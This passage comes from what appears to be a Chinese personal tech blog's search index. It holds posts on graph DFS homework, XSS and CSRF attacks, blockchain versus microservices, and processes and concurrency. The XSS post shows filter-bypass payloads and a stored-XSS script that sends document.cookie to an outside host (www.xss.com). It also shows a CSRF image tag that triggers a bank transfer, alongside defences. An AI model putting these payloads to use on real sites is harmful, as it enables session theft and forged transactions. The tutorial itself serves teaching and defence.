(*vNum)++; // 已遍历节点数+1 p = G-&gt;vertex[v].firstarc; // 获取头部结点指向的第一个 while (p != NULL) { (*eNum)++; // 边数+1 // 如果该结点未被遍历，就递归进行DFS if (visited[p-&gt;adjvex] == 0) DFS(G, p-&gt;adjvex, vNum, eNum); // 下一个结点 p = p-&gt;nextarc; }} T2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;stdio.h&gt;#define MaxSize 50 /*最大顶点个数*/typedef enum{ DG, DN, UG, UN} GraphKind; /*图的类型：有向图、有向网、无向图和无向网*/typedef struct ArcNode /*边表结点的类型定义*/{ int adjvex; /*弧指向的顶点的位置*/ char *info; /*与弧相关的信息*/ struct ArcNode *nextarc; /*指示下一个与该顶点相邻接的顶点*/} ArcNode;typedef struct VNode /*表头结点的类型定义*/{ char data; /*用于存储顶点*/ ArcNode *firstarc; /*指示第一个与该顶点邻接的顶点*/} VNode, AdjList[MaxSize];typedef struct /*图的类型定义*/{ AdjList vertex; int vexnum, arcnum; /*图的顶点数目与弧的数目*/ GraphKind kind; /*图的类型*/} AdjGraph;int visited[MaxSize];// 要求:非递归实现邻接表的DFS// 思路：能用递归完成，基本都能用栈实现，在需要递归的地方，将结点信息存入栈中，然后再取出// 时间复杂度：O(n)void DFS(AdjGraph *G, int v){ ArcNode *p; int top; Stack s; // 假设这是跟栈，储存结点信息 // 开始遍历 for (int i = 0; i &lt; G-&gt;vexnum; i++) { // 如果该点未被遍历 if (!visited[i]) { visited[i] = 1; // 标记 PushStack(*s, i); // 进栈 p = G-&gt;vertex[i].firstarc; // 获取该点的第一个邻接结点 // 循环，直到栈不空 while (!StackIsEmpty(s)) { while (p) { if (!visited[p-&gt;adjvex]) { visited[p-&gt;adjvex] = 1; PushStack(*s, p-&gt;adjvex); // 进栈 p = G-&gt;vertex[p-&gt;adjvex].firstarc; } else p = p-&gt;nextarc; } top = PopStack(s, *top); // 出栈，并将栈顶元素赋给top p = G-&gt;vertex[top].firstarc; } } }} 这里栈功能我并没有去写出实现（主要是麻烦），当然，栈也可也存结点，我这里只是存的结点信息（也就是在AdjList的位置）","categories":[{"name":"作业","slug":"作业","permalink":"https://github.com/z-anshun/categories/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://github.com/z-anshun/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"XSS攻击和CSRF攻击","slug":"xss","date":"2020-10-25T04:40:21.000Z","updated":"2020-10-25T04:59:00.013Z","comments":true,"path":"2020/10/25/xss/","link":"","permalink":"https://github.com/z-anshun/2020/10/25/xss/","excerpt":"","text":"XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。”【摘自维基百科】 xss 主要分为三类： DOM xss :DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。 反射型 xss :反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。 存储型 xss :存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。 说白了就是当你游览一下页面的时候，它可能就会窃取一些你的信息 DOM xss我们先来看一个例子 12345678910&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=”board”&gt; &lt;script&gt;alert(\"hello world\")&lt;/script&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这是一段很简单的HTML代码，当你访问这个页面的时候，就会有提示框弹出 虽然这里是“hello world”，但在真正的xss攻击中，还能做很多事情 比如： 1.窃取网页浏览中的cookie值 ​ js中有这样一个代码document.cookie，相信这个大家都知道吧，就是获取cookie，但是假设这个cookie是你登录某个页面时留下来的，这个cookie就相当于你的令牌。换句话说如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号 你都可以登录 不过我们也可以设置：Http-Only（只有在http请求头中会有此cookie信息，而不能通过document.cookie来访问此cookie） 保证同一cookie不能被滥用 2.劫持流量实现恶意跳转 ​ 试想一下，有这样一段代码 1&lt;script&gt;window.location.href=\"http://www.baidu.com\";&lt;/script&gt; 那么所访问的网站就会被跳转到百度的首页（该代码就是当有人访问这个页面的时候，这个事件都会发送，从而实现跳转） 据了解：在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博 反射型 xss反射型xss主要运用的是利用与绕过 大小写绕过 个别网站可能会过滤掉script标签，但是却没想到标签中的大小写并不影响浏览器的解释 如下： 1http://192.168.1.102/xss/example2.php?name=&lt;sCript&gt;alert(\"hey!\")&lt;/scRipt&gt; 如果访问这个网站，就会打印出‘hey’，换句话说&lt;script&gt;中的脚本被执行了 利用过滤后的返回语句再次构成攻击语句来绕过攻击 换句话说就是让过滤掉后了的语句中任有 script 标签 如： 1http://192.168.1.102/xss/example3.php?name=&lt;sCri&lt;script&gt;pt&gt;alert(\"hey!\")&lt;/scRi&lt;/script&gt;pt&gt; 这个了只过滤掉了 &lt;sCri 和 &lt;/scRi，但仍还有 script 标签，也就是仍然可以执行脚本 插入其它标签的代码 首先，并不是只有script标签的插入能够植入脚本的 比如 1http://192.168.1.102/xss/example4.php?name=&lt;img src='w.123' onerror='alert(\"hey!\")'&gt; 这里虽然插入的img标签，但该标签中的onerror事件任然执行了，也到达到了其目的 再比如 1&lt;a onmousemove=’do something here’&gt; 这里的onmousemove也能触发事件，其它还有onclick（点击事件发生）、onmouseenter（鼠标指针移动到元素上时触发事件）这类的，这些就涉及到一些前端的了，我在这里就不赘述 编码要植入的脚本代码绕过关键字的过滤 js中有个eval()方法，会将编码过的语句解码后再执行，从而便能绕过关键字过滤，如： 1http://192.168.1.102/xss/example5.php?name=&lt;script&gt;eval(\\u0061\\u006c\\u0065\\u0072\\u0074(1))&lt;/script&gt; 这里的\\u0061\\u006c\\u0065\\u0072\\u0074(1)，是alert(1)编码后的 主动闭合标签实现注入 我们先来看一份代码截图 这里，直接在js中拿取变量，但是，js不像go语言那种强类型语言，js是弱类型的，也就是对变量并没有明确的定义，所以当我们输入： 12http://192.168.1.102/xss/example6.php?name=\";alert(\"I am ahacker~\");\" 其代码就变成了这样，完成了脚本的植入 存储型 xss储存，就如字面上的意思，讲恶意代码储存在数据库里，通常是在留言板使用（可以设想一下，当一个人读留言板时，服务器肯定会向用户展示留言板的内容，但如果留言板储存的恶意脚本，不就执行了？就跟上面新浪微博的那个事件一样），这个跟反射型 xss不同的是，只需要用户访问这个页面就行了 这个跟DOM类型的 xss很相似 比如你在一个留言板上这么写 12345&lt;script&gt; while (true) { alert('Hello') }&lt;/script&gt; 那这个网站就可能会挂 或者这么写 123456&lt;script&gt; var img = document.createElement('img') img.src='http://www.xss.com?cookie=' + document.cookie img.style.display='none' document.getElementsByTagName('body')[0].appendChild(img) &lt;/script&gt; 这就就是将你该页面的cookie发送到http://www.xss.com这个网址（这个跟后面要说csrf是有点不一样，但一般是这两种混合来使用） 如何预防xss？ 首先是过滤。对诸如&lt;script&gt;、&lt;img&gt;、&lt;a&gt;等标签进行过滤。（尽管可能会逃过） 其次是编码。像一些常见的符号，如&lt;&gt;在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。 最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御（这里要记住，不能只是单纯的在表单里设置长度，因为是可以改的） CSRF攻击说完了上面的xss攻击，现在，我们来看看csrf攻击 概念：CSRF攻击，英文全称为Cross-site request forgery，中文的名称为跨站请求伪造，也被称为one click attack/session riding，其缩写为CSRF/XSRF,是一种非常常见的Web攻击方式 换句话说：就是hacker盗取了你的信息（比如 cookie，token这些），然后再以你的名义发送请求 比如： 首先用户在A网站登录了支付宝，然后支付宝把cookie返回给了游览器，但是，该用户在还没退出A网页时，又登录了恶意网站B，然后B网站又发送了一些带攻击型的代码，发送请求要求访问A网站，在这种情况下，用户并不知道发生了什么，但A网站是根据发了的cookie权限处理该请求的，并不知道该请求其实是由B发起的。 举个例子 如果某个银行网站，对转账的请求为：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 那么如果在网站B上，有这样一行代码 1&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; 这里的以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），而又恰好你刚刚登录了A网站，游览器还存又cookie，所以当你登录B网站时，浏 览器会带上你的银行网站A的Cookie发出Get请求 虽然这只是一个简单的例子，但即使该银行换成只能post表单请求，但B网站也能发送POST表单请求，这里我就不赘述了 其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制，WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的（也就是即是我们拿到了令牌，也不知道是否是用户批准的） 如何防御？ 验证码， 强制让用户在进行每次操作的时候输入验证码，以便让他知道自己在干什么（虽然这样给用户的体验会很不好） 检查HTTP Referer字段 在HTTP请求中，Referer字段的数据会带着上一次请求的地址，因此我们通过获取Referer字段，检测该字段是否为我们自己的站点地址，这样就可以避免CSRF攻击 但是这也有缺点 用户设置禁止发送Referer字段（跟设置禁止保存cookie是一样的） 个别插件可以伪造Referer字段 设置Token 很明显，CSRF攻击的本质是攻击者可以猜测到构造一个请求所需要的参数（也就是令牌），那么，如果要防御，其方法就是让参数变得不可猜测，token就可以做到 但要注意的是 token必须保密（也就是加密） 提交token时，不可直接放在url中（所以我们直接放在头部） 避免全站通用cookie，设置好cookie的域 总结：CSRF利用的是网站的令牌去请求，这属于网站本身的漏洞 XSS属于的是注入攻击，大多在留言板上（虽然现在一般的网址已经不行了）","categories":[{"name":"技术交流","slug":"技术交流","permalink":"https://github.com/z-anshun/categories/%E6%8A%80%E6%9C%AF%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"web攻击","slug":"web攻击","permalink":"https://github.com/z-anshun/tags/web%E6%94%BB%E5%87%BB/"}]},{"title":"初步了解区块链与微服务","slug":"struct","date":"2020-10-19T13:53:49.000Z","updated":"2020-10-25T07:01:55.353Z","comments":true,"path":"2020/10/19/struct/","link":"","permalink":"https://github.com/z-anshun/2020/10/19/struct/","excerpt":"","text":"因为对于个人而言，我经常搞混区块链和分布式，所以便狠下决心写了这篇文章 区块链 概念：从科技层面来看，区块链涉及数学、密码学、互联网和计算机编程等很多科学技术问题。从应用视角来看，简单来说，区块链是一个分布式的共享账本和数据库，具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点【摘自百度百科】 主要运用于金融、物联网和物流领域、公共服务领域等 1.要了解区块链，我们先来了解一个概念 去中心化去中心化 在一个分布有众多节点的系统中，每个节点都具有高度自治的特征。节点之间彼此可以自由连接，形成新的连接单元。任何一个节点都可能成为阶段性的中心，但不具备强制性的中心控制功能。节点与节点之间的影响，会通过网络而形成非线性因果关系。这种开放式、扁平化、平等性的系统现象或结构，我们称之为去中心化【摘自百度百科】 简单的来说，去中心化，就是不要中心，人人都可能成为中心的意思。（例如：Facebook，博客这类） 2.然后，为什么需要区块链这个东西呢？咱们以支付包转账举例： 这里，假设用户A购买了用户B的商品，支付宝便是第三方负责这个交易的。但，假设我们使用跑代码的方法进行入账和出账（这里补充一点，支付宝一开始人工处理这些交易的），怎么才能保证绝对的安全呢？很明显这点很难做到 这便是传统的中心化（所有的用户都以支付宝为中心）： 3.去中心化服务的区块链为了解决人工，安全等问题，支付宝便使用了区块链网络 用户各自为节点，各自为中心，每一个人都拥有各自的一个密钥，每个人都拥有着同一个账本，而不是由支付宝一个人账了。 这里可能又有人要问了，如果我修改了自己的拥有的那一份账本上自己的数据（假设你给自己账户+2 000 000），会造成什么影响呢？ 假设你修改了，但是其它51%的人的账户都还是显示的你是原来账户上的数据所以并不会改变（这也是传说中的比特币为什么那么难以攻破它市值的原因） （如果大家看过“硅谷“这个电视剧，有一个片段就是将的一个攻防战，讲的就是一个去中心化的服务，谁先占有51%的用户，就拥有网络的操作权） 分步式服务略微了解了区块链后，现在我们来了解下分布式服务框架（因为这两个对于刚开始了解的人很容易搞混） 概念：当计算机的程序和数据通过网络分布在多于一个的计算机上时，计算就成为“分布式的” 简单来说，就是一个硬件或软件组件分布在不同的网络计算机上，彼此之间仅仅通过消息传递进行通信和协调的系统，常见的消息传递就是通过HTTP的RESTful API进行传输 1.为什么要有分布式服务?首先，假设我们有个抢票系统的服务，并且这个使用的是单架构模式 若一个用户购票后，我们需要对数据库进行进行用户信息的处理和影票信息的处理 这里需要先了解：一个tomcat通常能够承载200~300并发（取决于硬件及网络等外界条件），一个mysql默认并发数100 所以，如果有大量用户同时购买，对数据库的压力就会很大，若其中用户信息溢出或影票信息的临时更新，都会导致整个服务不可用。 2.什么是分布式架构模式 概念：整个系统的功能单位分散到不同的进程,**然后够个进程共同提供不同的业务能力**,我们称之为”分布式架构”(Distributed Architecture) 光看概念肯定是难以理解，下面还是借用上面那个例子来举例 很明显两个数据库各储存各的，即是一个宕机了，也不会影响另一个。虽然我们看似分开处理比合并着处理好多了。但这也是有缺点的，一是数据库多了。维护成本自然大了，二则是对资源的要求也增加了。 3.微服务架构模式这里只做点了解，why？（因为我也不是很会） 首先先来了解什么是微服务 简单来说微服务就是很小的服务，小到一个服务只对应一个单一的功能，只做一件事。这个服务可以单独部署运行，服务之间可以通过RPC来相互交互，每个微服务都是由独立的小团队开发，测试，部署，上线，负责它的整个生命周期 那微服务架构又是啥？ 在做架构设计的时候，先做逻辑架构，再做物理架构，当你拿到需求后，估算过最大用户量和并发量后，计算单个应用服务器能否满足需求，如果用户量只有几百人的小应用，单体应用就能搞定，即所有应用部署在一个应用服务器里，如果是很大用户量，且某些功能会被频繁访问，或者某些功能计算量很大，建议将应用拆解为多个子系统，各自负责各自功能，这就是微服务架构。 分布式和微服务的区别： ​ 1.生产环境下的微服务肯定是分布式部署的，分布式部署的应用不一定是微服务架构的，比如集群部署，它是把相同应用复制到不同服务器上，但是逻辑功能上还是单体应用。 ​ 2.微服务架构模式很像分布式，但它的粒度更小，服务之间耦合度更低，由于每个微服务都由独立的小团队负责，因此它敏捷性更高，但维护起来也更麻烦 4.总结 单体架构 分布式架构 优点 1.易于开发 2.易于部署 3.易于扩展（后续可扩展多个副本） 1.吞吐量大 2.单个服务维护成本低 3.可靠性强（即是单个服务宕机了，其它服务也能正常运行） 缺点 1.可靠性差 2.维护成本高 3.吞吐量小 1.对技术要求高 2.人力成本大 3.资源要求大 总的来说区块链与分布式的联系并不是很大，但区块链使用了分布式架构的想法，实现去中心化，把每个用户都当作一个体，各自可为中心，而分布式则是面向的服务，把服务细分，各管各的。（更多关于区块链的可以去了解传说中的比特币） 参考链接：https://blog.csdn.net/weixin_45393094/article/details/104632343 https://zhuanlan.zhihu.com/p/22228902 https://blog.csdn.net/zhonglunsheng/article/details/83153451","categories":[{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"架构","slug":"架构","permalink":"https://github.com/z-anshun/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"浅谈进程与协程、异步与同步、并发与并行","slug":"infomal","date":"2020-10-14T13:35:35.000Z","updated":"2020-10-14T13:54:38.688Z","comments":true,"path":"2020/10/14/infomal/","link":"","permalink":"https://github.com/z-anshun/2020/10/14/infomal/","excerpt":"","text":"今天偶然看到异步和同步的文章，联想到了进程，线程这些。下面，我来浅谈一下进程、线程、异步和同步 进程和线程进程 一个程序的执行过程，是一个Windows系统中的一个动态的概念，包含了一个线程或多个线程。 每一个进程的都有自己的空间地址，内存不共享 一个进程至少有5种基本状态，分别是：初始态，执行态，等待状态，就绪状态，终止状态。 线程 CPU调度的和分配的基本单位 它可与同属的一个进程的多个线程共享资源 这里补充一点，协程(gorutine)是依赖于线程来管理的，就对GO语言而说，因为我们能直接管理线程，便通过协程来调度，实现其百万并发 进程和线程的区别 进程 线程 基本单元 资源分配的基本单元 cpu调度的基本单元 关于资源 不能共享 同一进程的线程可共享 创建与切换的开销 大 小 同步(Sync)和异步(Async)同步概念：在执行一个事件的时候，没有得到返回结果前，就不会继续往下执行 换句话来说：就是按顺序一件一件事情的做，只能等前一件事情做完了才能往下继续 举个例子 有个人头铁，提交了作业后，非要等评分出了，才去干其它事情 异步概念：与同步相对，在执行一个事件的时候，即是没有得到返回结果，也可以继续往下执行。但这里要注意的是当调用完成后，一般是通过状态、通知和回调来通知调用者的，并且调用的返回不再受调用者控制（这里可以联系到js的回调函数，具体我就不说） 举个​例子:后来，这个人变聪明，提交作业后，就不管了，去干其它事情了 同步和异步的区别总的来说，同步和异步的区别就是在于是否需要等待结果的返回 并发和并行并发 概念：在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理机上运行，但任一个时刻点上只有一个程序在处理机上运行。 这里需要补充的是，当多个线程在一个cpu上运行的时候，实际上也不是同时运行的，cpu只是将时间划分成多个时间段，然后分配给各个线程。当一个线程在运行的时候，其它线程处于阻塞状态 还是举个例子：当你在吃饭的时候，电话打来了，你就去接电话了，接完了回来再继续吃饭 并行 概念：当系统有一个以上CPU时，则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel) 简而言之，就是同时进行，举个例子：你在吃饭，电话来了，然后你边吃饭边接电话 并发与并行的总结并发主要的是 排队、等待、执行。 并行则时同时执行。 参考连接： https://www.cnblogs.com/mhq-martin/p/9035640.html https://www.cnblogs.com/linguanh/p/11629828.html","categories":[{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"基础","slug":"基础","permalink":"https://github.com/z-anshun/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-10-04T05:43:12.009Z","updated":"2020-10-04T05:43:12.009Z","comments":true,"path":"2020/10/04/hello-world/","link":"","permalink":"https://github.com/z-anshun/2020/10/04/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"},{"name":"安全","slug":"安全","permalink":"https://github.com/z-anshun/categories/%E5%AE%89%E5%85%A8/"},{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"},{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"},{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"作业","slug":"作业","permalink":"https://github.com/z-anshun/categories/%E4%BD%9C%E4%B8%9A/"},{"name":"技术交流","slug":"技术交流","permalink":"https://github.com/z-anshun/categories/%E6%8A%80%E6%9C%AF%E4%BA%A4%E6%B5%81/"},{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://github.com/z-anshun/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"},{"name":"计网","slug":"计网","permalink":"https://github.com/z-anshun/tags/%E8%AE%A1%E7%BD%91/"},{"name":"二叉树","slug":"二叉树","permalink":"https://github.com/z-anshun/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"滑动窗口","slug":"滑动窗口","permalink":"https://github.com/z-anshun/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"},{"name":"Redis","slug":"Redis","permalink":"https://github.com/z-anshun/tags/Redis/"},{"name":"BFS","slug":"BFS","permalink":"https://github.com/z-anshun/tags/BFS/"},{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"},{"name":"https","slug":"https","permalink":"https://github.com/z-anshun/tags/https/"},{"name":"动态窗口","slug":"动态窗口","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E6%80%81%E7%AA%97%E5%8F%A3/"},{"name":"Golang","slug":"Golang","permalink":"https://github.com/z-anshun/tags/Golang/"},{"name":"树状数组","slug":"树状数组","permalink":"https://github.com/z-anshun/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"},{"name":"数据结构","slug":"数据结构","permalink":"https://github.com/z-anshun/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"web攻击","slug":"web攻击","permalink":"https://github.com/z-anshun/tags/web%E6%94%BB%E5%87%BB/"},{"name":"架构","slug":"架构","permalink":"https://github.com/z-anshun/tags/%E6%9E%B6%E6%9E%84/"},{"name":"基础","slug":"基础","permalink":"https://github.com/z-anshun/tags/%E5%9F%BA%E7%A1%80/"}]}